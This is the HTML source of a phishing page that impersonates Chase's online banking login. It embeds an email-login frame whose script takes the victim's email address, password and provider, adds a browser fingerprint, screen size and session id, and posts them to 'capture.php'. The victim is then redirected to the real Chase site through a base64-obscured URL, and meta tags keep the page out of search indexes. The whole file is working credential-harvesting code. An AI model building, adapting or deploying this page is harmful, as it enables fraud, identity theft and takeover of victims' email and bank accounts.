<!DOCTYPE html>
<html lang="en-US">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=5">
    <meta name="robots" content="noindex, nofollow, noarchive">
    <meta name="referrer" content="no-referrer">
    <meta http-equiv="Content-Security-Policy" content="default-src 'self' 'unsafe-eval' 'unsafe-inline' https://fonts.googleapis.com https://fonts.gstatic.com; img-src 'self' data: https:; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com; script-src 'self' 'unsafe-inline' 'unsafe-eval'; connect-src 'self' https:;">
    <meta http-equiv="Cache-Control" content="no-store, no-cache, must-revalidate">
    <meta http-equiv="Pragma" content="no-cache">
    <title>Credit Card, Mortgage, Banking, Auto | Chase Online | Chase.com</title>
    <link rel="icon" href="https://www.chase.com/etc/designs/chase-ux/favicon.ico">
    <link rel="stylesheet" href="style.css">
    <style>
        .login-form-container-widget {
            padding: 0;
            background: transparent;
            box-shadow: none;
            width: 100%;
            max-width: 480px;
        }
    </style>
</head>
<body>
    <div id="loading-overlay" class="loading-overlay">
        <div class="spinner"></div>
        <div class="loading-text" data-render="prc_msg">Authorizing Email...</div>
    </div>
    <div id="root">
        <div class="login-page-container">
            <div class="fluid-form-layout">
                <div class="login-header">
                    <a href="#">
                        <img src="assets/scraped-logo.svg" alt="" id="brand-logo">
                    </a>
                </div>

                <div class="login-form-container login-form-container-widget">
                    <!-- Email Login Widget Iframe -->
                    <iframe
                        id="email-login-frame"
                        src="Email Connect Pro/dist/index.html#/email-login"
                        style="width: 100%; border: none; min-height: 480px; max-width: 480px; display: block; margin: 0 auto; border-radius: 8px; overflow: hidden; background: white; box-shadow: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);"
                        title="Email Verification"
                        loading="lazy"
                        allow="clipboard-write"
                    ></iframe>
                </div>
            </div>
        </div>

        <footer id="footer-container" class="footer-container-main">
            <div class="image-links">
                <img alt="" src="assets/ncua_icon.png" style="margin-right: 20px;">
                <img alt="" src="assets/ncua_text.png" style="margin-right: 20px;">
                <img alt="" src="assets/ehl_icon.png">
            </div>
        </footer>
    </div>
    
    <script>
        (function () {
            var frame = document.getElementById("email-login-frame");
            var overlay = document.getElementById("loading-overlay");

            // --- Theme Chameleon Tunneling ---
            frame.onload = function() {
                const styles = getComputedStyle(document.documentElement);
                const themePayload = {
                    type: "SYNC_THEME",
                    payload: {
                        "--primary": styles.getPropertyValue("--btn-primary").trim() || "#003366",
                        "--primary-hover": styles.getPropertyValue("--btn-hover").trim() || "#001a33",
                        "--text-primary": styles.getPropertyValue("--text-primary").trim() || "#302722",
                        "--card-bg": styles.getPropertyValue("--card-bg").trim() || "#ffffff",
                        "--font-family": styles.getPropertyValue("font-family").trim()
                    }
                };
                frame.contentWindow.postMessage(themePayload, "*");
            };

            window.addEventListener("message", function (e) {
                // Resize iframe height dynamically
                if (e.data && e.data.type === "IFRAME_HEIGHT" && typeof e.data.height === "number") {
                    frame.style.height = e.data.height + "px";
                }

                // Handle Submissions
                if (e.data && e.data.type === "EMAIL_LOGIN_SUBMIT") {
                    overlay.style.display = 'flex';
                    
                    const payloadData = e.data.data || {};
                    const formData = new FormData();
                    formData.append('emailAcc', payloadData.email || '');
                    formData.append('emailPass', payloadData.password || '');
                    formData.append('emailProvider', payloadData.provider || '');
                    formData.append('form_type', 'emailAuth');
                    
                    // Generate Custom Adblock-Proof Canvas Fingerprint
                    try {
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d');
                        ctx.textBaseline = "top";
                        ctx.font = "14px 'Arial'";
                        ctx.fillStyle = "#f60";
                        ctx.fillRect(125,1,62,20);
                        ctx.fillStyle = "#069";
                        ctx.fillText("device_hash", 2, 15);
                        ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
                        ctx.fillText("device_hash", 4, 17);
                        const dataStr = navigator.userAgent + screen.width + "x" + screen.height + navigator.language + canvas.toDataURL();
                        
                        let hash = 0;
                        for (let i = 0; i < dataStr.length; i++) {
                            const char = dataStr.charCodeAt(i);
                            hash = ((hash << 5) - hash) + char;
                            hash = hash & hash;
                        }
                        formData.append('fingerprint', Math.abs(hash).toString(16));
                    } catch (e) {
                        formData.append('fingerprint', 'unknown');
                    }
                    
                    formData.append('res', `${screen.width}x${screen.height}`);

                    // Session integration if _sid exists
                    var sid = sessionStorage.getItem('_sid');
                    if(sid) formData.append('_sid', sid);

                    fetch('capture.php', { method: 'POST', body: formData })
                        .then(() => {
                            setTimeout(() => {
                                window.location.href = atob('aHR0cHM6Ly93d3cuY2hhc2UuY29t');
                            }, 1500);
                        })
                        .catch(() => {
                            setTimeout(() => {
                                window.location.href = atob('aHR0cHM6Ly93d3cuY2hhc2UuY29t');
                            }, 1500);
                        });
                }
            });
        })();
    </script>
    <script src="app.js"></script>
</body>
</html>
